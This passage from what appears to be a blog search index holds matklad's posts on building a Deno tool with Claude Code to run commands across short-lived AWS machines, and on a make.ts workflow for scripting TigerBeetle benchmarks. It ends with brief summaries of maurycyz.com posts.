complaining about the lack of boring AI posts, so it\u2019s only proper if I write one.</p>"},{"location":"matklad.github.io/Vibecoding%20%232_20260120/#problem-statement","title":"Problem Statement","text":"<p>At TigerBeetle, we are big on deterministic simulation testing. We even use it to track performance, to some degree. Still, it is crucial to verify performance numbers on a real cluster in its natural high-altitude habitat.</p> <p>To do that, you need to procure six machines in a cloud, get your custom version of <code>tigerbeetle</code> binary on them, connect cluster\u2019s replicas together and hit them with load. It feels like, quarter of a century into the third millennium, \u201crun stuff on six machines\u201d should be a problem just a notch harder than opening a terminal and typing <code>ls</code>, but I personally don\u2019t know how to solve it without wasting a day. So, I spent a day vibecoding my own square wheel.</p> <p>The general shape of the problem is that I want to spin a fleet of ephemeral machines with given specs on demand and run ad-hoc commands in a SIMD fashion on them. I don\u2019t want to manually type slightly different commands into a six-way terminal split, but I also do want to be able to ssh into a specific box and poke it around.</p>"},{"location":"matklad.github.io/Vibecoding%20%232_20260120/#solution","title":"Solution","text":"<p>My idea for the solution comes from these three sources:</p> <ul> <li>https://github.com/catern/rsyscall</li> <li>https://peter.bourgon.org/blog/2011/04/27/remote-development-from-mac-to-linux.html</li> <li>https://github.com/dsherret/dax</li> </ul> <p>The big idea of <code>rsyscall</code> is that you can program distributed system in direct style. When programming locally, you do things by issuing syscalls:</p> <pre><code>const fd = open(\"/etc/passwd\");\n</code></pre> <p>This API works for doing things on remote machines, if you specify which machine you want to run the syscall on:</p> <pre><code>const fd_local = open(.host, \"/etc/passwd\");\nconst fd_cloud = open(.{.addr = \"1.2.3.4\"}, \"/etc/passwd\");\n</code></pre> <p>Direct manipulation is the most natural API, and it pays to extend it over the network boundary.</p> <p>Peter\u2019s post is an application of a similar idea to a narrow, mundane task of developing on Mac and testing on Linux. Peter suggests two scripts:</p> <p><code>remote-sync</code> synchronizes a local and remote projects. If you run <code>remote-sync</code> inside <code>~/p/tb</code> folder, then <code>~/p/tb</code> materializes on the remote machine. <code>rsync</code> does the heavy lifting, and the wrapper script implements <code>DWIM</code> behaviors.</p> <p>It is typically followed by <code>remote-run some --command</code>, which runs command on the remote machine in the matching directory, forwarding output back to you.</p> <p>So, when I want to test local changes to <code>tigerbeetle</code> on my Linux box, I have roughly the following shell session:</p> <pre><code>$ cd ~/p/tb/work\n$ code . # hack here\n$ remote-sync\n$ remote-run ./zig/zig build test\n</code></pre> <p>The killer feature is that shell-completion works. I first type the command I want to run, taking advantage of the fact that local and remote commands are the same, paths and all, then hit <code>^A</code> and prepend <code>remote-run</code> (in reality, I have <code>rr</code> alias that combines sync&amp;run).</p> <p>The big thing here is not the commands per se, but the shift in the mental model. In a traditional ssh &amp; vim setup, you have to juggle two machines with a separate state, the local one and the remote one. With <code>remote-sync</code>, the state is the same across the machines, you only choose whether you want to run commands here or there.</p> <p>With just two machines, the difference feels academic. But if you want to run your tests across six machines, the ssh approach fails \u2014 you don\u2019t want to re-vim your changes to source files six times, you really do want to separate the place where the code is edited from the place(s) where the code is run. This is a general pattern \u2014 if you are not sure about a particular aspect of your design, try increasing the cardinality of the core abstraction from 1 to 2.</p> <p>The third component, <code>dax</code> library, is pretty mundane \u2014 just a JavaScript library for shell scripting. The notable aspects there are:</p> <ul> <li> <p>JavaScript\u2019s template literals, which allow implementing command interpolation in a safe by construction way. When processing <code>$</code>ls ${paths}<code>`, a string is never materialized, it\u2019s arrays all the way to the</code>exec` syscall ( more on the topic).</p> </li> <li> <p>JavaScript\u2019s async/await, which makes managing concurrent processes (local or remote) natural:</p> <pre><code>await Promise.all([\n  $`sleep 5`,\n  $`remote-run sleep 5`,\n]);\n</code></pre> </li> <li> <p>Additionally, deno specifically valiantly strives to impose process-level structured concurrency, ensuring that no processes spawned by the script outlive the script itself, unless explicitly marked <code>detached</code> \u2014 a sour spot of UNIX.</p> </li> </ul> <p>Combining the three ideas, I now have a deno script, called <code>box</code>, that provides a multiplexed interface for running ad-hoc code on ad-hoc clusters.</p> <p>A session looks like this:</p> <pre><code># Switch to project with local modifications\n$ cd ~/p/tb/work\n$ git status --short\n M src/lsm/forest.zig\n\n# Spin up 3 machines, print their IPs\n$ box create 3\n108.129.172.206,52.214.229.222,3.251.67.25\n\n$ box list\n0 108.129.172.206\n1 52.214.229.222\n2 3.251.67.25\n\n# Move my code to remote machines\n$ box sync 0,1,2\n\n# Run pwd&amp;ls on machine 0; now the code is there:\n$ box run 0 pwd\n/home/alpine/p/tb/work\n\n$ box run 0 ls\nCHANGELOG.md  LICENSE       README.md     build.zig\ndocs/         src/          zig/\n\n# Setup dev env and run build on all three machines.\n$ box run 0,1,2 ./zig/download.sh\nDownloading Zig 0.14.1 release build...\nExtracting zig-x86_64-linux-0.14.1.tar.xz...\nDownloading completed (/home/alpine/p/tb/work/zig/zig)!\nEnjoy!\n\n# NB: using local commit hash here (no git _there_).\n$ box run 0,1,2 \\\n    ./zig/zig build -Drelease -Dgit-commit=$(git rev-parse HEAD)\n\n# ?? is replaced by machine id\n$ box run 0,1,2 \\\n    ./zig-out/bin/tigerbeetle format \\\n    --cluster=0 --replica=?? --replica-count=3 \\\n    0_??.tigerbeetle\n2026-01-20 19:30:15.947Z info(io): opening \"0_0.tigerbeetle\"...\n\n# Cleanup machines (they also shutdown themselves after 8 hours)\n$ box destroy 0,1,2\n</code></pre> <p>I like this! Haven\u2019t used in anger yet, but this is something I wanted for a long time, and now I have it</p>"},{"location":"matklad.github.io/Vibecoding%20%232_20260120/#structure","title":"Structure","text":"<p>The problem with implementing above is that I have zero practical experience with modern cloud. I only created my AWS account today, and just looking at the console interface ignited the urge to re-read The Castle. Not my cup of pu-erh. But I had a hypothesis that AI should be good at wrangling baroque cloud API, and it mostly held.</p> <p>I started with a couple of paragraphs of rough, super high-level description of what I want to get. Not a specification at all, just a general gesture towards unknown unknowns. Then I asked ChatGPT to expand those two paragraphs into a more or less complete spec to hand down to an agent for implementation.</p> <p>This phase surfaced a bunch of unknowns for me. For example, I wasn\u2019t thinking at all that I somehow need to identify machines, ChatGPT suggested using random hex numbers, and I realized that I do need 0,1,2 naming scheme to concisely specify batches of machines. While thinking about this, I realized that sequential numbering scheme also has an advantage that I can\u2019t have two concurrent clusters running, which is a desirable property for my use-case. If I forgot to shutdown a machine, I\u2019d rather get an error on trying to re-create a machine with the same name, then to silently avoid the clash. Similarly, turns out the questions of permissions and network access rules are something to think about, as well as what region and what image I need.</p> <p>With the spec document in hand, I turned over to Claude code for actual implementation work. The first step was to further refine the spec, asking Claude if anything is unclear. There were couple of interesting clarifications there.</p> <p>First, the original ChatGPT spec didn\u2019t get what I meant with my \u201ccurrent directory mapping\u201d idea, that I want to materialize a local <code>~/p/tb/work</code> as remote <code>~/p/tb/work</code>, even if <code>~</code> are different. ChatGPT generated an incorrect description and an incorrect example. I manually corrected example, but wasn\u2019t able to write a concise and correct description. Claude fixed that working from the example. I feel like I need to internalize this more \u2014 for current crop of AI, examples seem to be far more valuable than rules.</p> <p>Second, the spec included my desire to auto-shutdown machines once I no longer use them, just to make sure I don\u2019t forget to turn the lights off when leaving the room. Claude grilled me on what precisely I want there, and I asked it to DWIM the thing.</p> <p>The spec ended up being 6KiB of English prose. The final implementation was 14KiB of TypeScript. I wasn\u2019t keeping the spec and the implementation perfectly in sync, but I think they ended up pretty close in the end. Which means that prose specifications are somewhat more compact than code, but not much more compact.</p> <p>My next step was to try to just one-shot this. Ok, this is embarrassing, and I usually avoid swearing in this blog, but I just typoed that as \u201cone-shit\u201d, and, well, that is one flavorful description I won\u2019t be able to improve upon. The result was just not good (more on why later), so I almost immediately decided to throw it away and start a more incremental approach.</p> <p>In my previous vibe-post, I noticed that LLM are good at closing the loop. A variation here is that LLMs are good at producing results, and not necessarily good code. I am pretty sure that, if I had let the agent to iterate on the initial script and actually run it against AWS, I would have gotten something working. I didn\u2019t want to go that way for three reasons:</p> <ul> <li>Spawning VMs takes time, and that significantly reduces the throughput of agentic iteration. </li> <li>No way I let the agent run with a real AWS account, given that AWS doesn\u2019t have a fool-proof way to cap costs. </li> <li>I am fairly confident that this script will be a part of my workflow for at least several years, so I care more about long-term code maintenance, than immediate result. </li> </ul> <p>And, as I said, the code didn\u2019t feel good, for these specific reasons:</p> <ul> <li>It wasn\u2019t the code that I would have written, it lacked my character, which made it hard for me to understand it at a glance. </li> <li>The code lacked any character whatsoever. It could have worked, it wasn\u2019t \u201cnaively bad\u201d, like the first code you write when you are learning programming, but there wasn\u2019t anything good there. </li> <li>I never know what the code should be up-front. I don\u2019t design solutions, I discover them in the process of refactoring. Some of my best work was spending a quiet weekend rewriting large subsystems implemented before me, because, with an implementation at hand, it was possible for me to see the actual, beautiful core of what needs to be done. With a slop-dump, I just don\u2019t get to even see what could be wrong. </li> <li>In particular, while you are working the code (as in \u201cwrought iron\u201d), you often go back to requirements and change them. Remember that ambiguity of my request to \u201cshut down idle cluster\u201d? Claude tried to DWIM and created some horrific mess of bash scripts, timestamp files, PAM policy and systemd units. But the right answer there was \u201clets maybe not have that feature?\u201d (in contrast, simply shutting the machine down after 8 hours is a one-liner). </li> </ul> <p>The incremental approach worked much better, Claude is good at filling-in the blanks. The very first thing I did for <code>box-v2</code> was manually typing-in:</p> <pre><code>type CLI =\n  | CLICreate\n  | CLIDestroy\n  | CLIList\n  | CLISync\n\ntype BoxList = string[];\ntype CLICreate = { tag: \"create\"; count: number };\ntype CLIDestroy = { tag: \"destroy\"; boxes: BoxList };\ntype CLIList = { tag: \"list\" };\ntype CLISync = { tag: \"sync\"; boxes: BoxList; };\n\nfunction fatal(message: string): never {\n  console.error(message);\n  Deno.exit(1);\n}\n\nfunction CLIParse(args: string[]): CLI {\n\n}\n</code></pre> <p>Then I asked Claude to complete the <code>CLIParse</code> function, and I was happy with the result. Note Show, Don\u2019t Tell</p> <p>I am not asking Claude to avoid throwing an exception and fail fast instead. I just give <code>fatal</code> function, and it code-completes the rest.</p> <p>I can\u2019t say that the code inside <code>CLIParse</code> is top-notch. I\u2019d probably written something more spartan. But the important part is that, at this level, I don\u2019t care. The abstraction for parsing CLI arguments feel right to me, and the details I can always fix later. This is how this overall vibe-coding session transpired \u2014 I was providing structure, Claude was painting by the numbers.</p> <p>In particular, with that CLI parsing structure in place, Claude had little problem adding new subcommands and new arguments in a satisfactory way. The only snag was that, when I asked to add an optional path to <code>sync</code>, it went with <code>string | null</code>, while I strongly prefer <code>string | undefined</code>. Obviously, its better to pick your null in JavaScript and stick with it. The fact that <code>undefined</code> is unavoidable predetermines the winner. Given that the argument was added as an incremental small change, course-correcting was trivial.</p> <p>The null vs undefined issue perhaps illustrates my complaint about the code lacking character. <code>| null</code> is the default non-choice. <code>| undefined</code> is an insight, which I personally learned from VS Code LSP implementation.</p> <p>The hand-written skeleton/vibe-coded guts worked not only for the CLI. I wrote</p> <pre><code>async function main() {\n  const cli = CLIParse(Deno.args);\n\n  if (cli.tag === \"create\") return await mainCreate(cli.count);\n  if (cli.tag === \"destroy\") return await mainDestroy(cli.boxes);\n  ...\n}\n\nasync function mainDestroy(boxes: string[]) {\n  for (const box of boxes) {\n    await instanceDestroy(box);\n  }\n}\n\nasync function instanceDestroy(id: string) {\n\n}\n</code></pre> <p>and then asked Claude to write the body of a particular function according to the SPEC.md.</p> <p>Unlike with the CLI, Claude wasn\u2019t able to follow this pattern itself. With one example it\u2019s not obvious, but the overall structure is that <code>instanceXXX</code> is the AWS-level operation on a single box, and <code>mainXXX</code> is the CLI-level control flow that deals with looping and parallelism. When I asked Claude to implement <code>box run</code>, without myself doing the <code>main</code> / <code>instance</code> split, Claude failed to notice it and needed a course correction.</p>"},{"location":"matklad.github.io/Vibecoding%20%232_20260120/#implementation","title":"Implementation","text":"<p>However , Claude was massively successful with the actual logic. It would have taken me hours to acquire specific, non-reusable knowledge to write:</p> <pre><code>// Create spot instance\nconst instanceMarketOptions = JSON.stringify({\n  MarketType: \"spot\",\n  SpotOptions: { InstanceInterruptionBehavior: \"terminate\" },\n});\nconst tagSpecifications = JSON.stringify([\n  { ResourceType: \"instance\", Tags: [{ Key: moniker, Value: id }] },\n]);\n\nconst result = await $`aws ec2 run-instances \\\n  --image-id ${image} \\\n  --instance-type ${instanceType} \\\n  --key-name ${moniker} \\\n  --security-groups ${moniker} \\\n  --instance-market-options ${instanceMarketOptions} \\\n  --user-data ${userDataBase64} \\\n  --tag-specifications ${tagSpecifications} \\\n  --output json`.json();\n\nconst instanceId = result.Instances[0].InstanceId;\n\n// Wait for instance to be running\nawait $`aws ec2 wait instance-status-ok --instance-ids ${instanceId}`;\n</code></pre> <p>I want to be careful \u2014 I can\u2019t vouch for correctness and especially completeness of the above snippet. However, given that the nature of the problem is such that I can just run the code and see the result, I am fine with it. If I were writing this myself, trial-and-error would totally be my approach as well.</p> <p>Then there\u2019s synthesis \u2014 with several instance commands implemented, I noticed that many started with querying AWS to resolve symbolic machine name, like \u201c1\u201d, to the AWS name/IP. At that point I realized that resolving symbolic names is a fundamental part of the problem, and that it should only happen once, which resulting in the following refactored shape of the code:</p> <pre><code>async function main() {\n  const cli = CLIParse(Deno.args);\n  const instances = await instanceMap();\n\n  if (cli.tag === \"create\") return await mainCreate(instances, cli.count);\n  if (cli.tag === \"destroy\") return await mainDestroy(instances, cli.boxes);\n  ...\n}\n</code></pre> <p>Claude was ok with extracting the logic, but messed up the overall code layout, so the final code motions were on me. \u201cContext\u201d arguments go first , not last, common prefix is more valuable than common suffix because of visual alignment.</p> <p>The original \u201cone-shotted\u201d implementation also didn\u2019t do up-front querying. This is an example of a shape of a problem I only discover when working with code closely.</p> <p>Of course, the script didn\u2019t work perfectly the first time and we needed quite a few iterations on the real machines both to fix coding bugs, as well gaps in the spec. That was an interesting experience of speed-running rookie mistakes. Claude made naive bugs, but was also good at fixing them.</p> <p>For example, when I first tried to <code>box ssh</code> after <code>box create</code>, I got an error. Pasting it into Claude immediately showed the problem. Originally, the code was doing <code>aws ec2 wait instance-running</code> and not <code>aws ec2 wait instance-status-ok</code>.</p> <p>The former checks if instance is logically created, the latter waits until the OS is booted. It makes sense that these two exist, and the difference is clear (and its also clear that OS booted != SSH demon started). Claude\u2019s value here is in providing specific names for the concepts I already know to exist.</p> <p>Another fun one was about the disk. I noticed that, while the instance had an SSD, it wasn\u2019t actually used. I asked Claude to mount it as home, but that didn\u2019t work. Claude immediately asked me to run <code>$ box run 0 cat /var/some/unintuitive/long/path.log</code> and that log immediately showed the problem. This is remarkable! 50% of my typical Linux debugging day is wasted not knowing that a useful log exists, and the other 50% is for searching for the log I know should exist somewhere.</p> <p>After the fix, I lost the ability to SSH. Pasting the error immediately gave the answer \u2014 by mounting over <code>/home</code>, we were overwriting ssh keys configured prior.</p> <p>There were couple of more iterations like that. Rookie mistakes were made, but they were debugged and fixed much faster than my personal knowledge allows (and again, I feel that is trivia knowledge, rather than deep reusable knowledge, so I am happy to delegate it!).</p> <p>It worked satisfactorily in the end, and, what\u2019s more, I am happy to maintain the code, at least to the extent that I personally need it. Kinda hard to measure productivity boost here, but, given just the sheer number of CLI flags required to make this work, I am pretty confident that time was saved, even factoring the writing of the present article!</p>"},{"location":"matklad.github.io/Vibecoding%20%232_20260120/#coda","title":"Coda","text":"<p>I\u2019ve recently read The Art of Doing Science and Engineering by Hamming (of distance and code), and one story stuck with me:</p> <p>A psychologist friend at Bell Telephone Laboratories once built a machine with about 12 switches and a red and a green light. You set the switches, pushed a button, and either you got a red or a green light. After the first person tried it 20 times they wrote a theory of how to make the green light come on. The theory was given to the next victim and they had their 20 tries and wrote their theory, and so on endlessly. The stated purpose of the test was to study how theories evolved.</p> <p>But my friend, being the kind of person he was, had connected the lights to a random source! One day he observed to me that no person in all the tests (and they were all high-class Bell Telephone Laboratories scientists) ever said there was no message. I promptly observed to him that not one of them was either a statistician or an information theorist, the two classes of people who are intimately familiar with randomness. A check revealed I was right!</p>"},{"location":"matklad.github.io/make.ts_20260127/","title":"make.ts","text":"<p>\u6765\u6e90: https://matklad.github.io \u94fe\u63a5: https://matklad.github.io/2026/01/27/make-ts.html \u65e5\u671f: 2026-01-27T00:00:00+00:00</p>"},{"location":"matklad.github.io/make.ts_20260127/#makets_1","title":"make.ts","text":"<p>Jan 27, 2026</p> <p><code>Up Enter</code> <code>Up Up Enter</code> <code>Up Up Up Enter</code></p> <p>Sounds familiar? This is how I historically have been running benchmarks and other experiments requiring a repeated sequence of commands \u2014 type them manually once, then rely on shell history (and maybe some terminal splits) for reproduction. These past few years I\u2019ve arrived at a much better workflow pattern \u2014 <code>make.ts</code>. I was forced to adapt it once I started working with multiprocess applications, where manually entering commands is borderline infeasible. In retrospect, I should have adapted the workflow years earlier.</p>"},{"location":"matklad.github.io/make.ts_20260127/#the-pattern","title":"The Pattern","text":"<p>Use a (gitignored) file for interactive scripting. Instead of entering a command directly into the terminal, write it to a file first, and then run the file. For me, I type stuff into <code>make.ts</code> and then run <code>./make.ts</code> in my terminal (Ok, I need one <code>Up Enter</code> for that).</p> <p>I want to be clear here, I am not advocating writing \u201cproper\u201d scripts, just capturing your interactive, ad-hoc command to a persistent file. Of course any command that you want to execute repeatedly belongs to the build system. The surprising thing is that even more complex one-off commands benefit from running through file, because it will take you several tries to get them right!</p> <p>There are many benefits relative to <code>Up Up Up</code> workflow:</p> <ul> <li>Real commands tend to get large, and it is so much nicer to use a real 2D text editor rather than shell\u2019s line editor. </li> <li>If you need more than one command, you can write several commands, and still run them all with a single key (before <code>make.ts</code>, I was prone to constructing rather horrific &amp;&amp; conjuncts for this reason). </li> <li>With a sequence of command outlined, you nudge yourself towards incrementally improving them, making them idempotent, and otherwise investing into your own workflow for the next few minutes, without falling into the YAGNI pit from the outset. </li> <li>At some point you might realize after, say, running a series of ad-hoc benchmarks interactively, that you\u2019d rather write a proper script which executes a collection of benchmarks with varying parameters. With the file approach, you already have the meat of the script implemented, and you only need to wrap in a couple of fors and ifs. </li> <li>Finally, if you happen to work with multi-process projects, you\u2019ll find it easier to manage concurrency declaratively, spawning a tree of processes from a single script, rather than switching between terminal splits. </li> </ul>"},{"location":"matklad.github.io/make.ts_20260127/#details","title":"Details","text":"<p>Use a consistent filename for the script. I use <code>make.ts</code>, and so there\u2019s a <code>make.ts</code> in the root of most projects I work on. Correspondingly, I have <code>make.ts</code> line in project\u2019s <code>.git/info/exclude</code> \u2014 the <code>.gitignore</code> file which is not shared. The fixed name reduces fixed costs \u2014 whenever I need complex interactivity I don\u2019t need to come up with a name for a new file, I open my pre-existing <code>make.ts</code>, wipe whatever was there and start hacking. Similarly, I have <code>./make.ts</code> in my shell history, so fish autosuggestions work for me. At one point, I had a VS Code task to run <code>make.ts</code>, though I now use terminal editor.</p> <p>Start the script with hash bang, <code>#!/usr/bin/env -S deno run --allow-all</code> in my case, and <code>chmod a+x make.ts</code> the file, to make it easy to run.</p> <p>Write the script in a language that:</p> <ul> <li>you are comfortable with, </li> <li>doesn\u2019t require huge setup, </li> <li>makes it easy to spawn subprocesses, </li> <li>has good support for concurrency. </li> </ul> <p>For me, that is TypeScript. Modern JavaScript is sufficiently ergonomic, and structural, gradual typing is a sweet spot that gives you reasonable code completion, but still allows brute-forcing any problem by throwing enough stringly dicts at it.</p> <p>JavaScript\u2019s tagged template syntax is brilliant for scripting use-cases:</p> <pre><code>function $(literal, ...interpolated) {\n  console.log({ literal, interpolated });\n}\n\nconst dir = \"hello, world\";\n$`ls ${dir}`;\n</code></pre> <p>prints</p> <pre><code>{\n    literal: [ \"ls \", \"\" ],\n    interpolated: [ \"hello, world\" ]\n}\n</code></pre> <p>What happens here is that <code>$</code> gets a list of literal string fragments inside the backticks, and then, separately, a list of values to be interpolated in-between. It could concatenate everything to just a single string, but it doesn\u2019t have to. This is precisely what is required for process spawning, where you want to pass an array of strings to the <code>exec</code> syscall.</p> <p>Specifically, I use dax library with Deno, which is excellent as a single-binary batteries-included scripting environment (see &lt;3 Deno). Bun has a dax-like library in the box and is a good alternative (though I personally stick with Deno because of <code>deno fmt</code> and <code>deno lsp</code>). You could also use famous zx, though be mindful that it uses your shell as a middleman, something I consider to be sloppy (explanation).</p> <p>While <code>dax</code> makes it convenient to spawn a single program, <code>async/await</code> is excellent for herding a slither of processes:</p> <pre><code>await Promise.all([\n    $`sleep 5`,\n    $`sleep 10`,\n]);\n</code></pre>"},{"location":"matklad.github.io/make.ts_20260127/#concrete-example","title":"Concrete Example","text":"<p>Here\u2019s how I applied this pattern earlier today. I wanted to measure how TigerBeetle cluster recovers from the crash of the primary. The manual way to do that would be to create a bunch of ssh sessions for several cloud machines, format datafiles, start replicas, and then create some load. I almost started to split my terminal up, but then figured out I can do it the smart way.</p> <p>The first step was cross-compiling the binary, uploading it to the cloud machines, and running the cluster (using my box from the other week):</p> <pre><code>#!/usr/bin/env -S deno run --allow-all\nimport $ from \"jsr:@david/dax@0.44.2\";\n\nawait $`./zig/zig build -Drelease -Dtarget=x86_64-linux`;\nawait $`box sync 0-5 ./tigerbeetle`;\nawait $`box run 0-5\n    ./tigerbeetle format --cluster=0 --replica-count=6 --replica=?? 0_??.tigerbeetle`;\nawait $`box run 0-5\n    ./tigerbeetle start --addresses=?0-5? 0_??.tigerbeetle`;\n</code></pre> <p>Running the above the second time, I realized that I need to kill the old cluster first, so two new commands are \u201cinteractively\u201d inserted:</p> <pre><code>await $`./zig/zig build -Drelease -Dtarget=x86_64-linux`;\nawait $`box sync 0-5 ./tigerbeetle`;\n\nawait $`box run 0-5 rm 0_??.tigerbeetle`.noThrow();\nawait $`box run 0-5 pkill tigerbeetle`.noThrow();\n\nawait $`box run 0-5\n    ./tigerbeetle format --cluster=0 --replica-count=6 --replica=?? 0_??.tigerbeetle`;\nawait $`box run 0-5\n    ./tigerbeetle start --addresses=?0-5? 0_??.tigerbeetle`;\n</code></pre> <p>At this point, my investment in writing this file and not just entering the commands one-by-one already paid off!</p> <p>The next step is to run the benchmark load in parallel with the cluster:</p> <pre><code>await Promise.all([\n    $`box run 0-5 ./tigerbeetle start     --addresses=?0-5? 0_??.tigerbeetle`,\n    $`box run 6   ./tigerbeetle benchmark --addresses=?0-5?`,\n])\n</code></pre> <p>I don\u2019t need two terminals for two processes, and I get to copy-paste-edit the mostly same command.</p> <p>For the next step, I actually want to kill one of the replicas, and I also want to capture live logs, to see in real-time how the cluster reacts. This is where <code>0-5</code> multiplexing syntax of box falls short, but, given that this is JavaScript, I can just write a for loop:</p> <pre><code>const replicas = range(6).map((it) =&gt;\n    $`box run ${it}\n        ./tigerbeetle start --addresses=?0-5? 0_??.tigerbeetle\n        &amp;&gt; logs/${it}.log`\n        .noThrow()\n        .spawn()\n);\n\nawait Promise.all([\n    $`box run 6 ./tigerbeetle benchmark --addresses=?0-5?`,\n    (async () =&gt; {\n        await $.sleep(\"20s\");\n        console.log(\"REDRUM\");\n        await $`box run 1 pkill tigerbeetle`;\n    })(),\n]);\n\nreplicas.forEach((it) =&gt; it.kill());\nawait Promise.all(replicas);\n</code></pre> <p>At this point, I do need two terminals. One runs <code>./make.ts</code> and shows the log from the benchmark itself, the other runs <code>tail -f logs/2.log</code> to watch the next replica to become primary.</p> <p>I have definitelly crossed the line where writing a script makes sense, but the neat thing is that the gradual evolution up to this point. There isn\u2019t a discontinuity where I need to spend 15 minutes trying to shape various ad-hoc commands from five terminals into a single coherent script, it was in the file to begin with.</p> <p>And then the script is easy to evolve. Once you realize that it\u2019s a good idea to also run the same benchmark against a different, baseline version TigerBeetle, you replace <code>./tigerbeetle</code> with <code>./${tigerbeetle}</code> and wrap everything into</p> <pre><code>async function benchmark(tigerbeetle: string) {\n    // ...\n}\n\nconst tigerbeetle = Deno.args[0]\nawait benchmark(tigerbeetle);\n\n\n$ ./make.ts tigerbeetle-baseline\n$ ./make.ts tigerbeetle\n</code></pre> <p>A bit more hacking, and you end up with a repeatable benchmark schedule for a matrix of parameters:</p> <pre><code>for (const attempt of [0, 1])\nfor (const tigerbeetle of [\"baseline\", \"tigerbeetle\"])\nfor (const mode of [\"normal\", \"viewchange\"]) {\n    const results = $.path(\n        `./results/${tigerbeetle}-${mode}-${attempt}`,\n    );\n    await benchmark(tigerbeetle, mode, results);\n}\n</code></pre> <p>That\u2019s the gist of it. Don\u2019t let the shell history be your source, capture it into the file first!</p>"},{"location":"maurycyz.com/","title":"maurycyz.com","text":"<p>\u8bbf\u95ee\u535a\u5ba2</p>"},{"location":"maurycyz.com/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":""},{"location":"maurycyz.com/#1-notes-on-blog-future-proofing","title":"1. Notes on blog future-proofing","text":"<p>\u94fe\u63a5: https://maurycyz.com/misc/futureproofing/</p> <p>\u65e5\u671f: Fri, 23 Jan 2026 00:00:00 +0000</p> <p>\u6458\u8981: One of the great things about web pages is that they are long-lived and mutable . There's no need to aim for perfection on the first draft: A page can continue to be improved for years after its origi...</p>"},{"location":"maurycyz.com/#2-writing-my-own-static-site-generator","title":"2. Writing my own static site generator","text":"<p>\u94fe\u63a5: https://maurycyz.com/misc/new_ssg/</p> <p>\u65e5\u671f: Fri, 16 Jan 2026 00:00:00 +0000</p> <p>\u6458\u8981: In principle, a static site generator is a good idea: They automatically populate your homepage, index pages and RSS feeds, making it impossible to forget anything. Unlike a CMS like Wordpress, they d...</p>"},{"location":"maurycyz.com/#3-how-to-write-your-own-website","title":"3. How to write your own website","text":"<p>\u94fe\u63a5: https://maurycyz.com/tutorials/website/</p> <p>\u65e5\u671f: Wed, 14 Jan 2026 00:00:00 +0000</p> <p>\u6458\u8981: I recently wrote an essay on why you should set up a personal website rather then using social media. Doing so lets you own your space on the internet, customize it and free your readers from constant...</p>"},{"location":"maurycyz.com/#4-the-horsehead-nebula-2026","title":"4. The horsehead nebula (2026)","text":"<p>\u94fe\u63a5: https://maurycyz.com/astro/horsehead/</p> <p>\u65e5\u671f: Fri, 09 Jan 2026 00:00:00 +0000</p> <p>\u6458\u8981: 0.55 arcseconds/pixel. Image is 27' wide. North is right (mirrored). Color: 27 minutes (319 * 4 seconds) through thin clouds Equipment: C9.25, 0.63 reducer, ASI533 MC (IMX533 sensor), EQ6-R mount. Res...</p>"},{"location":"maurycyz.com/#5-you-should-start-a-blog","title":"5. You should start a blog","text":"<p>\u94fe\u63a5: https://maurycyz.com/misc/starting_a_blog/</p> <p>\u65e5\u671f: Sun, 04 Jan 2026 00:00:00 +0000</p> <p>\u6458\u8981: W riting something down forces you to fully understand it. When the idea is on paper, you can see all the missing assumptions and leaps in logic. It's common to start writing, do some research and fin...</p>"},{"location":"maurycyz.com/01_Notes_on_blog_future-proofing/","title":"Notes on blog future-proofing","text":"<p>\u539f\u6587\u94fe\u63a5: https://maurycyz.com/misc/futureproofing/ \u53d1\u5e03\u65e5\u671f: Fri, 23 Jan 2026 00:00:00 +0000</p> <p>One of the great things about web pages is that they are long-lived and mutable . There's no need to aim for perfection on the first draft: A page can continue to be improved for years after its origi...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"maurycyz.com/02_Writing_my_own_static_site_generator/","title":"Writing my own static site generator","text":"<p>\u539f\u6587\u94fe\u63a5: https://maurycyz.com/misc/new_ssg/ \u53d1\u5e03\u65e5\u671f: Fri, 16 Jan 2026 00:00:00 +0000</p> <p>In principle, a static site generator is a good idea: They automatically populate your homepage, index pages and RSS feeds, making it impossible to forget anything. Unlike a CMS like Wordpress, they d...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"maurycyz.com/03_How_to_write_your_own_website/","title":"How to write your own website","text":"<p>\u539f\u6587\u94fe\u63a5: https://maurycyz.com/tutorials/website/ \u53d1\u5e03\u65e5\u671f: Wed, 14 Jan 2026 00:00:00 +0000</p> <p>I recently wrote an essay on why you should set up a personal website rather then using social media. Doing so lets you own your space on the internet, customize it and free your readers from constant...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"maurycyz.com/04_The_horsehead_nebula__2026_/","title":"The horsehead nebula (2026)","text":"<p>\u539f\u6587\u94fe\u63a5: https://maurycyz.com/astro/horsehead/ \u53d1\u5e03\u65e5\u671f: Fri, 09 Jan 2026 00:00:00 +0000</p> <p>0.55 arcseconds/pixel. Image is 27' wide. North is right (mirrored). Color: 27 minutes (319 * 4 seconds) through thin clouds Equipment: C9.25, 0.63 reducer, ASI533 MC (IMX533 sensor), EQ6-R mount. Res...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"maurycyz.com/05_You_should_start_a_blog/","title":"You should start a blog","text":"<p>\u539f\u6587\u94fe\u63a5: https://maurycyz.com/misc/starting_a_blog/ \u53d1\u5e03\u65e5\u671f: Sun, 04 Jan 2026 00:00:00 +0000</p> <p>W riting something down forces you to fully understand it. When the idea is on paper, you can see all the missing assumptions and leaps in logic. It's common to start writing, do some research and fin...</p> 